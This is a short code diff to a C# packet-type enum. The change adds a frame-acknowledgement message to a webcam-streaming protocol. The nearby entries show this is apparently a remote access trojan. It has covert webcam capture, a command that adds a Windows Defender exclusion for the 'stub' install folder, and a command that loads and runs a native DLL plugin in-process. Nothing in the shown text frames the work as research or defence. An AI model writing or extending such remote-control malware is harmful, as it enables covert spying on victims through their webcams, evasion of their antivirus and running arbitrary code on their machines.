@@ -40,6 +40,7 @@ public enum PacketType
     WcamStop = 61,       // bidirectional
     WcamFrame = 62,      // client→server: {Fn, W, H, J}
     WcamDevices = 63,    // client→server: {Devices:[...]}
+    WcamFrameAck = 64,   // server→client: ready for next frame
 
     DefenderExclude = 70, // server→client: add WMI exclusion for stub install dir (no payload)
     PluginExec = 71,      // server→client: load + run a native DLL plugin in-process
